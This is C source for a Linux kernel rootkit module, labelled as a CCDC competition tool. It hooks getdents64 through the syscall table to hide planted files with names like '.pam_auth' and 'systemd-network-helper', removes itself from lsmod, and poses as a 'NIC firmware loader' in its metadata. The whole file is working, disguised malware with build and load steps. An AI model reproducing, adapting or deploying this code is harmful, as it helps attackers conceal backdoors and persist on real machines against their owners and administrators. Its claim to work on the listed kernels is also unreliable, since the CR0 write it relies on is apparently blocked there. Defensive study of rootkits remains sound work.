// Minimal CCDC competition LKM.
// Hides planted files from getdents64 (ls, find).
// Removes itself from lsmod output.
//
// Compatible with kernels >= 5.7 (uses kprobe to find kallsyms_lookup_name).
// Tested against Rocky Linux 9 (5.14.x) and Ubuntu 22.04 (5.15.x).
//
// Build:  make KVER=$(uname -r)
// Load:   insmod rootkit.ko
// Unload: rmmod rootkit  (only works if you know the module name — hidden from lsmod)

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("kernel-team");
MODULE_DESCRIPTION("NIC firmware loader v2");
MODULE_VERSION("2.1.0");

// Files whose names START with this prefix are hidden.
#define HIDE_PREFIX  ".def_"
// Files whose names contain any of these exact strings are hidden.
static const char *HIDE_NAMES[] = {
    ".sysaudit",
    ".pam_auth",
    ".net-helper",
    "systemd-network-helper",
    ".sys.sync",
    NULL
};

// ── kprobe → kallsyms_lookup_name ────────────────────────────────────────────
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t kln_fn = NULL;
static struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };

// ── Syscall table hook ────────────────────────────────────────────────────────
static unsigned long *sys_call_table = NULL;
typedef asmlinkage long (*getdents64_fn_t)(const struct pt_regs *);
static getdents64_fn_t orig_getdents64 = NULL;

static inline void unprotect_mem(void)
{
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 & ~0x00010000UL);
}

static inline void protect_mem(void)
{
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 | 0x00010000UL);
}

// ── Name filter ───────────────────────────────────────────────────────────────
static bool should_hide(const char *name)
{
    int i;
    if (strncmp(name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0)
        return true;
    for (i = 0; HIDE_NAMES[i]; i++) {
        if (strstr(name, HIDE_NAMES[i]))
            return true;
    }
    return false;
}

// ── Hooked getdents64 ─────────────────────────────────────────────────────────
asmlinkage long hooked_getdents64(const struct pt_regs *regs)
{
    long ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    struct linux_dirent64 __user *dirp =
        (struct linux_dirent64 __user *)regs->si;

    struct linux_dirent64 *kbuf = kvmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, dirp, ret)) {
        kvfree(kbuf);
        return ret;
    }

    long offset = 0;
    long new_ret = 0;
    char *write_pos = (char *)kbuf;

    while (offset < ret) {
        struct linux_dirent64 *ent =
            (struct linux_dirent64 *)((char *)kbuf + offset);
        unsigned short reclen = ent->d_reclen;
        offset += reclen;

        if (should_hide(ent->d_name))
            continue;

        if (write_pos != (char *)ent)
            memmove(write_pos, ent, reclen);
        write_pos += reclen;
        new_ret += reclen;
    }

    if (new_ret > 0 && copy_to_user(dirp, kbuf, new_ret))
        new_ret = ret;
    else if (new_ret == 0)
        new_ret = 0;

    kvfree(kbuf);
    return new_ret;
}

// ── Hide self from lsmod (/proc/modules) ─────────────────────────────────────
static void hide_self(void)
{
    list_del_init(&THIS_MODULE->list);
}

// ── Init / exit ───────────────────────────────────────────────────────────────
static int __init rootkit_init(void)
{
    int r;

    // Find kallsyms_lookup_name via kprobe
    r = register_kprobe(&kp);
    if (r < 0)
        return r;
    kln_fn = (kallsyms_lookup_name_t)(uintptr_t)kp.addr;
    unregister_kprobe(&kp);

    sys_call_table = (unsigned long *)kln_fn("sys_call_table");
    if (!sys_call_table)
        return -ENOENT;

    orig_getdents64 = (getdents64_fn_t)sys_call_table[__NR_getdents64];

    unprotect_mem();
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    protect_mem();

    hide_self();
    return 0;
}

static void __exit rootkit_exit(void)
{
    if (!sys_call_table || !orig_getdents64)
        return;
    unprotect_mem();
    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    protect_mem();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
